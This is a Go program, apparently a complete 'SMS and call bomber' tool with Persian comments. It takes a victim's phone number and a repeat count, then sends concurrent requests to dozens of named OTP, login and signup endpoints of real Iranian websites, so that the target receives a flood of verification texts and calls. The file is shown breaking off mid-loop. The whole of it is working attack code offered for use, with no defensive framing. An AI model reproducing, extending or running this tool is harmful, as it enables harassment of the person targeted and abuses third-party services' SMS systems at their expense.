package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"    
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
	const retryDelay = 2 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue // برو به تلاش بعدی
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			// بررسی نوع خطا برای تلاش مجدد
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError // یا شاید کد خطای دیگری برای خطاهای شبکه
					return
				}
				time.Sleep(retryDelay)
				continue // برو به تلاش بعدی
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 // سیگنال لغو
				return
			} else {
				// خطای غیرمنتظره یا غیرمرتبط با شبکه که نباید تلاش مجدد شود
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// اگر درخواست موفق بود (بدون خطا در ارسال)، وضعیت را میفرستیم و خارج میشویم
		ch <- resp.StatusCode
		resp.Body.Close() // بستن بدنه پاسخ پس از استفاده
		return // درخواست موفق بود، نیازی به تلاش مجدد نیست
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود

	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
	const retryDelay = 3 * time.Second // فاصله زمانی بین تلاش‌های مجدد

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 // سیگنال لغو
			return
		default:
			// ادامه اجرای حلقه اگر Context لغو نشده باشد
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel() 
	}()

	tasks := make(chan func(), repeatCount*40) 


	numWorkers := 20

	var wg sync.WaitGroup
	ch := make(chan int, repeatCount*40) 

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task() 
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {

		// virgool.io (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // virgool.io (JSON) 
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
				"identifier": phone,
			}, &wg, ch)
		}
	

		// ebcom.mci.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
				"msisdn": phone,
			}, &wg, ch)
		}

		// account.api.balad.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// api.cafebazaar.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}

		// gamefa.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("digits_phone", phone)
			// شاید نیاز باشد پارامترهای دیگری هم برای admin-ajax.php ارسال شود (مثل action)
			// اگر کار نکرد، باید مستندات API این سایت را بررسی کنید
			sendFormRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// app.mediana.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.mediana.ir/api/account/AccountApi/CreateOTPWithPhone", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// anbaronline.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.anbaronline.ir/account/sendotpjson", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// appapi.sms.ir (JSON) - این payload عجیب است (کلید خالی)
		// فرض میکنیم منظور ارسال فقط شماره تلفن به عنوان مقدار برای یک کلید پیش فرض یا در بدنه بوده
		// این مورد نیاز به بررسی دقیق تر API دارد، اما با فرض JSON و کلید "phone" میفرستیم
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://appapi.sms.ir/api/app/auth/sign-up/verification-code", map[string]interface{}{
				"phone": phone, // حدس بر اساس استفاده رایج
			}, &wg, ch)
		}

		// api.torob.com (JSON) - در URL هم پارامتر دارد که ممکن است نادیده گرفته شود در POST JSON
		wg.Add(1)
		tasks <- func() {
			// URL اصلی حاوی query parameter است که ممکن است در POST JSON نادیده گرفته شود.
			// فرض میکنیم پارامتر اصلی در بدنه JSON است.
			sendJSONRequest(ctx, "https://api.torob.com/v4/user/phone/send-pin/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// app.ezpay.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.ezpay.ir:8443/open/v1/user/validation-code", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// ws.alibaba.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// api.achareh.co (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// filimo.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.filimo.com/api/fa/v1/user/Authenticate/signup_step1", map[string]interface{}{
				"account": phone,
			}, &wg, ch)
		}

		// nazarkade.com (Form) - مسیر wp-content/plugins/... و php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			// ممکن است نیاز به پارامترهای اضافی باشد
			sendFormRequest(ctx, "https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", formData, &wg, ch)
		}

		// nazarkade.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobileNo", phone)
			// ممکن است نیاز به پارامتر action هم باشد
			sendFormRequest(ctx, "https://nazarkade.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// api.motabare.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.motabare.ir/v1/core/user/initial/", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// api.baloan.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.baloan.ir/api/v1/accounts/login-otp", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// api.mydigipay.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
				"cellNumber": phone,
			}, &wg, ch)
		}

		// e-estekhdam.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.e-estekhdam.com/panel/users/authenticate/start?redirect=/search", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}

		// emp.e-estekhdam.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://emp.e-estekhdam.com/users/authenticate/start?redirect=/", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}

		// tikban.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// oteacher.org (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://oteacher.org/api/user/register/mobile", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// buskool.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.buskool.com/send_verification_code", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// kilid.com (JSON) - URL شامل پارامتر query است. payload یک کلید خالی دارد.
		// فرض میکنیم پارامتر اصلی در URL است و payload خالی یا نامعتبر است.
		wg.Add(1)
		tasks <- func() {
			// Payload با کلید خالی ممکن است نامعتبر باشد. با فرض اینکه فقط URL مهم است یا payload خالی است:
			sendJSONRequest(ctx, "https://kilid.com/api/uaa/portal/auth/v1/otp?captchaId=akah8cgoLOvIfKnE1mx3lXOB4NrXJ0LWIXim8TTe4EETy7EKGJgAtjkFzcfF6M33i2IK8aqmJrg1X1nc59osFA%253D%253D", map[string]interface{}{
				// اگر نیاز به کلید خاصی در payload بود، اینجا اضافه شود.
				"phone": phone, // حدس بر اساس نیاز APIهای مشابه
			}, &wg, ch)
		}

		// roustaee.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobileNo", phone)
			// ممکن است نیاز به پارامتر action هم باشد
			sendFormRequest(ctx, "https://roustaee.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// dr-ross.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://dr-ross.ir/users/CheckRegisterMobile?returnUrl=%2F", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// api.epasazh.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.epasazh.com/api/v4/blind-otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// github account:
		// number 1

		// nobat.ir (Form) - payload شبیه به فرم داده با boundary است
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			// این ساختار payload عجیب است، فرض میکنیم فقط نیاز به ارسال "mobile"=phone به صورت Form Data است
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://nobat.ir/api/public/patient/login/phone", formData, &wg, ch)
		}

		// api.snapp.express (Form) - URL شامل پارامترهای query زیاد و payload شبیه به فرم داده
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			// کلید 'cellphone=' ممکن است نیاز به حذف '=' اضافی داشته باشد
			formData.Set("cellphone", phone)
			// URL اصلی را حفظ میکنیم
			sendFormRequest(ctx, "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b", formData, &wg, ch)
		}

		// azki.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// drdr.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://drdr.ir/api/v3/auth/login/mobile/init", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// gw.taaghche.com (JSON) - login
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gw.taaghche.com/v4/site/auth/login", map[string]interface{}{
				"contact": phone,
			}, &wg, ch)
		}

		// gw.taaghche.com (JSON) - signup
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
				"contact": phone,
			}, &wg, ch)
		}

		// application2.billingsystem.ayantech.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
				"MobileNumber": phone,
			}, &wg, ch)
		}

		// api.vandar.io (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.vandar.io/account/v1/check/mobile", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// api.mobit.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v8/register/register", map[string]interface{}{
				"number": phone,
			}, &wg, ch)
		}

		// api.pinorest.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// ws.alibaba.ir (JSON) - تکراری، ولی اضافه میکنیم طبق لیست شما
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// takshopaccessorise.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
				"mobile_phone": phone,
			}, &wg, ch)
		}

		// number2:

		// api.lendo.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// api.torob.com (JSON) - تکراری، ولی اضافه میکنیم
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.torob.com/v4/user/phone/send-pin", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// drdr.ir (JSON) - تکراری، ولی اضافه میکنیم
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://drdr.ir/api/registerEnrollment/verifyMobile", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// app.itoll.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// gateway.telewebion.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// core.gap.im (JSON) - تکراری، ولی اضافه میکنیم
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.gap.im/v1/user/add.json", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// hamrahsport.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://hamrahsport.com/send-otp", map[string]interface{}{
				"cell": phone,
			}, &wg, ch)
		}

		// harikashop.com (Form) - مسیر wp-admin/admin-ajax.php یا مشابه آن نیست اما ممکن است فرم باشد
		// با فرض JSON
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://harikashop.com/login?back=my-account", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}

		// zzzagros.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("username", phone)
			// ممکن است نیاز به پارامتر action هم باشد
			sendFormRequest(ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// arastag.ir (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobileemail", phone)
			// ممکن است نیاز به پارامتر action هم باشد
			sendFormRequest(ctx, "https://arastag.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// tamimpishro.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.tamimpishro.com/site/api/v1/user/otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// api2.fafait.net (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api2.fafait.net/oauth/check-user", map[string]interface{}{
				"id": phone,
			}, &wg, ch)
		}

		// fankala.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobileNo", phone)
			// ممکن است نیاز به پارامتر action هم باشد
			sendFormRequest(ctx, "https://fankala.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// khanoumi.com (JSON) - تکراری، ولی اضافه میکنیم
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// filmnet.ir (URL based) - این URL شامل متغیر درونی است و payload عجیب است
		// فرض میکنیم نیاز به GET یا POST بدون payload پیچیده است. با فرض POST JSON با کلید ساده
		wg.Add(1)
		tasks <- func() {
			// URL اصلی باید با phone پر شود
			url := fmt.Sprintf("https://filmnet.ir/api-v2/access-token/users/0%s/otp", phone)
			// Payload "otp:login":phone عجیب است. با فرض JSON و کلید "phone"
			sendJSONRequest(ctx, url, map[string]interface{}{
				"phone": phone, // حدس بر اساس نیاز APIهای مشابه
			}, &wg, ch)
		}

		// namava.ir (JSON) - تکراری، ولی اضافه میکنیم
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
				"UserName": phone,
			}, &wg, ch)
		}


		// sabziman.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phonenumber", phone)
			// ممکن است نیاز به پارامتر action هم باشد
			sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

		// flightio.com (JSON) - payload با s2
		// s2 به شکل "'userKey':'98-'%s ,'userKeyType': 1" تعریف شده که ساختار JSON نیست
		// فرض میکنیم منظور JSON با دو کلید userKey و userKeyType بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
				"userKey":     "98-" + phone, // ترکیب کد کشور با شماره
				"userKeyType": 1,
			}, &wg, ch)
		}

		// flightio.com (JSON) - payload ساده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
				"userKey": phone,
			}, &wg, ch)
		}

		// bck.behtarino.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// api.abantether.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// novinbook.com (Form) - payload با s57 که فرم داده است و URL query هم دارد
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			// s57 به شکل "phone=%s&call=yes" تعریف شده که فرم داده است
			formData.Set("phone", phone)
			formData.Set("call", "yes")
			// URL اصلی را حفظ میکنیم که query parameter دارد
			sendFormRequest(ctx, "https://novinbook.com/index.php?route=account/phone", formData, &wg, ch)
		}

		// azki.com (JSON) - URL شامل متغیر است که نیاز به fmt.Sprintf دارد. تکراری هم هست.
		wg.Add(1)
		tasks <- func() {
			url := fmt.Sprintf("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/%s", phone)
			// payload هم دارد، ممکن است در این حالت payload نادیده گرفته شود یا نیاز به بررسی بیشتر API باشد.
			// با فرض اینکه payload هم لازم است:
			sendJSONRequest(ctx, url, map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// api.pooleno.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// agent.wide-app.ir (JSON) - payload شبیه JSON اما کلیدهای پیچیده دارد
		// فرض میکنیم منظور JSON با کلیدهای ساده شده بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://agent.wide-app.ir/auth/token", map[string]interface{}{
				"grant_type": "otp",
				"client_id":  "62b30c4af53e3b0cf100a4a0",
				"phone":      phone,
			}, &wg, ch)
		}

		// api.zarinplus.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// messengerg2c4.iranlms.ir (JSON) - payload پیچیده شبیه JSON اما با string format
		// se به شکل "'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}"
		// نیاز به ساختار دهی JSON واقعی دارد
		wg.Add(1)
		tasks <- func() {
			// ساختار دهی payload به صورت JSON معتبر
			payload := map[string]interface{}{
				"api_version": "3",
				"method":      "sendCode",
				"data": map[string]interface{}{
					"phone_number": phone,
					"send_type":    "SMS",
				},
			}
			sendJSONRequest(ctx, "https://messengerg2c4.iranlms.ir/", payload, &wg, ch)
		}

		// lms.tamland.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// account.bama.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}

		// ws.alibaba.ir (JSON) - تکراری
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}

		// api.bitbarg.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// api.bahramshop.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}

		// api.bitpin.ir (JSON) - کلید "phone=" عجیب است
		// فرض میکنیم منظور JSON با کلید "phone" بوده
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
				"phone": phone, // حدس بر اساس نیاز APIهای مشابه
			}, &wg, ch)
		}

		// server.kilid.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

